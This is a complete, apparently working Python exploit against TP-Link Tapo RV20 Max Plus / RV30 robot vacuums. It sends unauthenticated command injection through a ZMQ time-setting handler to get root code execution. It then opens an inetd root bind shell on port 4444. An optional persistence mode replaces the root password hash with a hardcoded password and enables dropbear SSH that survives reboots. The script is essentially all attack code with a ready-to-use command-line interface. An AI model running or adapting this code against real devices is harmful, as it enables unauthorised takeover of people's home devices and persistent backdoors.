#!/usr/bin/env python3
"""
Root shell exploit for TP-Link Tapo RV20 Max Plus / RV30 (LDRobot OEM).

Exploits unauthenticated command injection in the /Time/SetSystemTime
ZMQ handler on port 30001. The time_str field is passed unsanitized to
system("date -u -s \"%s\""), giving pre-auth RCE as root.

The --persist flag enables the dropbear SSH server already in the device
rootfs by creating a gate file on writable flash and setting the root
password. SSH survives reboots.

Requirements: pip install pyzmq
"""

import argparse
import crypt
import json
import socket
import subprocess
import sys
import time

import zmq

ZMQ_PORT = 30001
DEFAULT_SHELL_PORT = 4444
SSH_PORT = 22
ROOT_PASSWORD = "tapohax"
SHADOW_PATH = "/oem/bin/sys_data/shadow"


def zmq_send(
    ip: str, topic: str, body: dict, timeout_ms: int = 5000
) -> tuple[int, bytes]:
    """Send a ZMQ 2-frame multipart request and return (status, response)."""
    ctx = zmq.Context()
    sock = ctx.socket(zmq.REQ)
    sock.setsockopt(zmq.RCVTIMEO, timeout_ms)
    sock.setsockopt(zmq.SNDTIMEO, timeout_ms)
    sock.setsockopt(zmq.LINGER, 0)
    sock.connect(f"tcp://{ip}:{ZMQ_PORT}")
    sock.send_multipart([topic.encode(), json.dumps(body).encode()])
    try:
        resp = sock.recv_multipart()
        return int.from_bytes(resp[0], "little"), resp[1]
    except zmq.Again:
        return -1, b"TIMEOUT"
    finally:
        sock.close()
        ctx.term()


def inject(ip: str, cmd: str, timeout_ms: int = 5000) -> tuple[int, bytes]:
    """
    Inject a shell command via /Time/SetSystemTime.

    The handler runs: system("date -u -s \"%s\"")
    We send:          2026-01-01"; <cmd>; #
    Which executes:   date -u -s "2026-01-01"; <cmd>; #"
    """
    payload = f'2026-01-01"; {cmd}; #'
    return zmq_send(ip, "/Time/SetSystemTime", {"time_str": payload}, timeout_ms)


def check_port(ip: str, port: int, timeout: float = 2.0) -> bool:
    """Check if a TCP port is open."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((ip, port))
        s.close()
        return result == 0
    except (socket.error, OSError):
        return False


def sh(ip: str, port: int, cmd: str, timeout: float = 5.0) -> str:
    """Send a command to the inetd shell and return output."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.sendall((cmd + "\n").encode())
        time.sleep(0.5)
        out = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                out += chunk
            except socket.timeout:
                break
        s.close()
        return out.decode("utf-8", errors="replace").strip()
    except (socket.error, OSError) as e:
        return f"ERROR: {e}"


def deploy_shell(ip: str, port: int) -> bool:
    """Deploy an inetd root shell via command injection."""
    if check_port(ip, port):
        print(f"[+] Shell already listening on {ip}:{port}")
        return True

    print(f"[*] Testing ZMQ on {ip}:{ZMQ_PORT}...")
    status, body = inject(ip, "true")
    if status != 0:
        print(f"[!] ZMQ failed (status={status}, body={body})")
        return False
    print(f"[+] Injection channel open")

    print(f"[*] Writing inetd config (port {port})...")
    line = f"{port} stream tcp nowait root /bin/sh sh"
    inject(ip, f'echo \\"{line}\\" > /tmp/inetd_sh.conf')
    time.sleep(0.5)

    print(f"[*] Starting inetd...")
    inject(ip, "busybox inetd /tmp/inetd_sh.conf")
    time.sleep(1.5)

    for attempt in range(3):
        if check_port(ip, port):
            print(f"[+] Shell UP on {ip}:{port}")
            return True
        if attempt < 2:
            print(f"[*] Waiting...")
            time.sleep(2)

    print(f"[!] Port {port} not open. Device reachable? Firewall?")
    return False


def deploy_persist(ip: str, shell_port: int) -> bool:
    """
    Enable persistent SSH using the dropbear already in the rootfs.

    1. Set root password in /etc/shadow (-> /oem/bin/sys_data/shadow, writable UBIFS)
    2. Create gate file /userdata/cfg/init.d/dropbear (writable UBIFS)
    3. Create /var/run/dropbear/ for host keys (tmpfs, regenerated on boot)
    4. Start dropbear -R

    After reboot, /etc/init.d/S50dropbear finds the gate file and starts SSH.
    """
    print()
    print(f"[*] === Enabling persistent SSH ===")

    def run(cmd: str) -> str:
        return sh(ip, shell_port, cmd)

    # Step 1: Set root password
    print(f"[*] Setting root password...")
    new_hash = crypt.crypt(ROOT_PASSWORD, crypt.mksalt(crypt.METHOD_MD5))
    shadow = run(f"cat {SHADOW_PATH}")
    old_hash = ""
    for line in shadow.splitlines():
        if line.startswith("root:"):
            old_hash = line.split(":")[1]
            break
    if not old_hash:
        print(f"[!] Could not read root hash from {SHADOW_PATH}")
        return False

    old_esc = old_hash.replace("$", "\\$")
    new_esc = new_hash.replace("$", "\\$")
    run(f'sed -i "s|{old_esc}|{new_esc}|" {SHADOW_PATH}')

    verify = run(f"head -1 {SHADOW_PATH}")
    if new_hash.split("$")[3][:8] in verify:
        print(f"[+] Root password set to '{ROOT_PASSWORD}'")
        print(f"[*] Original hash: {old_hash}")
    else:
        print(f"[!] Password change may have failed")

    # Step 2: Create gate file
    if check_port(ip, SSH_PORT):
        gate = run("cat /userdata/cfg/init.d/dropbear 2>&1")
        if "No such file" not in gate:
            print(f"[+] SSH already running with gate file")
            print(f"[+] ssh root@{ip}  (password: {ROOT_PASSWORD})")
            return True

    print(f"[*] Creating gate file...")
    run("mkdir -p /userdata/cfg/init.d")
    run("echo 1 > /userdata/cfg/init.d/dropbear")
    gate = run("cat /userdata/cfg/init.d/dropbear")
    if "1" not in gate:
        print(f"[!] Failed to create gate file")
        return False
    print(f"[+] Gate file created (survives reboot)")

    # Step 3: Host key directory
    print(f"[*] Creating host key directory...")
    run("mkdir -p /var/run/dropbear")

    # Step 4: Start dropbear
    print(f"[*] Starting dropbear...")
    run(
        "start-stop-daemon -S -q -p /var/run/dropbear.pid --exec /usr/sbin/dropbear -- -R"
    )
    time.sleep(1.5)

    if not check_port(ip, SSH_PORT):
        run("/usr/sbin/dropbear -R")
        time.sleep(1.5)

    if check_port(ip, SSH_PORT):
        print(f"[+] SSH UP on {ip}:{SSH_PORT}")
        print()
        print(f"[+] ssh root@{ip}  (password: {ROOT_PASSWORD})")
        return True

    print(f"[!] SSH port not open")
    return False


def main():
    p = argparse.ArgumentParser(
        description="Root exploit for TP-Link Tapo RV20 Max Plus / RV30",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  %(prog)s 192.168.1.50                        root shell on :4444
  %(prog)s 192.168.1.50 --persist              + persistent SSH on :22
  %(prog)s 192.168.1.50 --exec "id"            run one command
  %(prog)s 192.168.1.50 --inject-only "ls /"   raw injection, no shell
  %(prog)s 192.168.1.50 --interactive           nc into shell
        """,
    )
    p.add_argument("ip", help="Device IP address")
    p.add_argument(
        "--shell-port",
        type=int,
        default=DEFAULT_SHELL_PORT,
        help=f"inetd shell port (default: {DEFAULT_SHELL_PORT})",
    )
    p.add_argument("--exec", metavar="CMD", help="Run a single command")
    p.add_argument(
        "--interactive", action="store_true", help="Interactive shell via nc"
    )
    p.add_argument(
        "--persist",
        action="store_true",
        help="Enable persistent SSH (dropbear, survives reboot)",
    )
    p.add_argument(
        "--inject-only", metavar="CMD", help="Inject a raw command, no shell setup"
    )
    args = p.parse_args()

    print("=" * 55)
    print("  Tapo RV20 Max Plus / RV30 Root Exploit")
    print("  /Time/SetSystemTime command injection")
    print("=" * 55)
    print()

    if args.inject_only:
        print(f"[*] Injecting: {args.inject_only}")
        status, body = inject(args.ip, args.inject_only)
        print(f"[*] Status: {status}, Body: {body}")
        return

    if not deploy_shell(args.ip, args.shell_port):
        sys.exit(1)

    print()

    if args.persist:
        if not deploy_persist(args.ip, args.shell_port):
            print(f"[!] Persistence failed, inetd shell still available")
            print(f"[+] nc {args.ip} {args.shell_port}")

    if getattr(args, "exec"):
        print(f"[*] Running: {getattr(args, 'exec')}")
        print(sh(args.ip, args.shell_port, getattr(args, "exec")))

    elif args.interactive:
        print(f"[*] Connecting...")
        try:
            subprocess.run(["nc", args.ip, str(args.shell_port)])
        except FileNotFoundError:
            try:
                subprocess.run(["ncat", args.ip, str(args.shell_port)])
            except FileNotFoundError:
                print(f"[!] nc/ncat not found. Run: nc {args.ip} {args.shell_port}")

    elif not args.persist:
        output = sh(args.ip, args.shell_port, "id")
        print(f"[+] {output}")
        print()
        print(f"[+] nc {args.ip} {args.shell_port}")
        print(f"[*] For persistent SSH: {sys.argv[0]} {args.ip} --persist")


if __name__ == "__main__":
    main()
